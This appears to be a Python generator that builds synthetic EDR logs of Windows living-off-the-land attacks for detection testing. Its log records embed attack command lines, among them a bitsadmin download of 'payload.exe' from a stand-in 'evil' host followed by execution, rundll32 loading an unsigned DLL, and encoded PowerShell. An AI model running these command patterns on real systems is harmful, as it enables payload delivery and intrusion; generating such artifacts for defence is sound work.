import json
from typing import Dict, Any

from .base import ArtifactGenerator, GENERATORS

class MakeEdrJsonLolbinGenerator(ArtifactGenerator):
    """Generate EDR logs showing living-off-the-land techniques"""
    
    def generate(self, params: Dict[str, Any]) -> bytes:
        exe = params.get('exe', 'bitsadmin')
        tree_depth = params.get('tree_depth', 3)
        
        events = []
        
        # Generate process tree for LOLBin technique
        if exe == 'bitsadmin':
            events.extend(self._generate_bitsadmin_events(tree_depth))
        elif exe == 'rundll32':
            events.extend(self._generate_rundll32_events(tree_depth))
        elif exe == 'wmic':
            events.extend(self._generate_wmic_events(tree_depth))
        else:
            events.extend(self._generate_bitsadmin_events(tree_depth))
        
        # Add some normal system events for noise
        events.extend(self._generate_normal_events(10))
        
        # Sort by timestamp
        events.sort(key=lambda x: x['timestamp'])
        
        # Wrap in EDR log format
        log_data = {
            'format': 'edr_events',
            'version': '1.0',
            'source': 'windows_endpoint',
            'events': events
        }
        
        return json.dumps(log_data, indent=2).encode('utf-8')
    
    def _generate_bitsadmin_events(self, depth: int) -> list:
        """Generate BITSADMIN-based file download events"""
        events = []
        
        # Parent process (often cmd.exe or powershell.exe)
        parent_pid = self.rng.randint(1000, 9999)
        bitsadmin_pid = self.rng.randint(1000, 9999)
        
        # Initial parent process
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'process_create',
            'process_id': parent_pid,
            'parent_process_id': 123,
            'process_name': 'cmd.exe',
            'command_line': 'cmd.exe',
            'user': 'CORP\\user001',
            'integrity_level': 'Medium'
        })
        
        # BITSADMIN execution
        malicious_url = f"http://evil.{self._deterministic_string(8)}.com/payload.exe"
        download_path = f"C:\\Users\\Public\\{self._deterministic_string(8)}.exe"
        
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'process_create',
            'process_id': bitsadmin_pid,
            'parent_process_id': parent_pid,
            'process_name': 'bitsadmin.exe',
            'command_line': f'bitsadmin.exe /transfer job {malicious_url} {download_path}',
            'user': 'CORP\\user001',
            'integrity_level': 'Medium',
            'signature_status': 'Signed',
            'signer': 'Microsoft Corporation'
        })
        
        # Network connection
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'network_connection',
            'process_id': bitsadmin_pid,
            'process_name': 'bitsadmin.exe',
            'protocol': 'TCP',
            'local_port': self.rng.randint(49152, 65535),
            'remote_ip': self._deterministic_ip(),
            'remote_port': 80,
            'direction': 'outbound'
        })
        
        # File write
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'file_create',
            'process_id': bitsadmin_pid,
            'process_name': 'bitsadmin.exe',
            'file_path': download_path,
            'file_size': self.rng.randint(1024, 1024*1024),
            'md5': self._deterministic_string(32, '0123456789abcdef'),
            'sha256': self._deterministic_string(64, '0123456789abcdef')
        })
        
        # If depth > 1, show execution of downloaded file
        if depth > 1:
            payload_pid = self.rng.randint(1000, 9999)
            
            events.append({
                'timestamp': self._deterministic_timestamp(),
                'event_type': 'process_create',
                'process_id': payload_pid,
                'parent_process_id': parent_pid,
                'process_name': f'{self._deterministic_string(8)}.exe',
                'command_line': download_path,
                'user': 'CORP\\user001',
                'integrity_level': 'Medium',
                'signature_status': 'Unsigned'
            })
        
        return events
    
    def _generate_rundll32_events(self, depth: int) -> list:
        """Generate RUNDLL32-based execution events"""
        events = []
        
        parent_pid = self.rng.randint(1000, 9999)
        rundll32_pid = self.rng.randint(1000, 9999)
        
        # Parent process
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'process_create',
            'process_id': parent_pid,
            'parent_process_id': 456,
            'process_name': 'powershell.exe',
            'command_line': 'powershell.exe -enc <base64>',
            'user': 'CORP\\user001',
            'integrity_level': 'Medium'
        })
        
        # RUNDLL32 with suspicious DLL
        malicious_dll = f"C:\\Users\\Public\\{self._deterministic_string(8)}.dll"
        
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'process_create',
            'process_id': rundll32_pid,
            'parent_process_id': parent_pid,
            'process_name': 'rundll32.exe',
            'command_line': f'rundll32.exe {malicious_dll},DllRegisterServer',
            'user': 'CORP\\user001',
            'integrity_level': 'Medium',
            'signature_status': 'Signed',
            'signer': 'Microsoft Corporation'
        })
        
        # DLL load event
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'image_load',
            'process_id': rundll32_pid,
            'process_name': 'rundll32.exe',
            'image_path': malicious_dll,
            'signature_status': 'Unsigned',
            'md5': self._deterministic_string(32, '0123456789abcdef')
        })
        
        return events
    
    def _generate_wmic_events(self, depth: int) -> list:
        """Generate WMIC-based execution events"""
        events = []
        
        parent_pid = self.rng.randint(1000, 9999)
        wmic_pid = self.rng.randint(1000, 9999)
        
        # WMIC process creation
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'process_create',
            'process_id': wmic_pid,
            'parent_process_id': parent_pid,
            'process_name': 'wmic.exe',
            'command_line': 'wmic process call create "calc.exe"',
            'user': 'CORP\\user001',
            'integrity_level': 'Medium',
            'signature_status': 'Signed',
            'signer': 'Microsoft Corporation'
        })
        
        # Spawned process
        calc_pid = self.rng.randint(1000, 9999)
        events.append({
            'timestamp': self._deterministic_timestamp(),
            'event_type': 'process_create',
            'process_id': calc_pid,
            'parent_process_id': 4,  # System process (WMIC creates orphaned processes)
            'process_name': 'calc.exe',
            'command_line': 'calc.exe',
            'user': 'CORP\\user001',
            'integrity_level': 'Medium'
        })
        
        return events
    
    def _generate_normal_events(self, count: int) -> list:
        """Generate normal system events for noise"""
        events = []
        
        normal_processes = [
            'svchost.exe', 'explorer.exe', 'chrome.exe', 'notepad.exe',
            'winlogon.exe', 'csrss.exe', 'lsass.exe'
        ]
        
        for _ in range(count):
            process = self.rng.choice(normal_processes)
            
            events.append({
                'timestamp': self._deterministic_timestamp(),
                'event_type': 'process_create',
                'process_id': self.rng.randint(1000, 9999),
                'parent_process_id': self.rng.randint(100, 999),
                'process_name': process,
                'command_line': process,
                'user': 'CORP\\user001',
                'integrity_level': 'Medium',
                'signature_status': 'Signed'
            })
        
        return events

# Register generator
GENERATORS['make_edr_json_lolbin'] = MakeEdrJsonLolbinGenerator
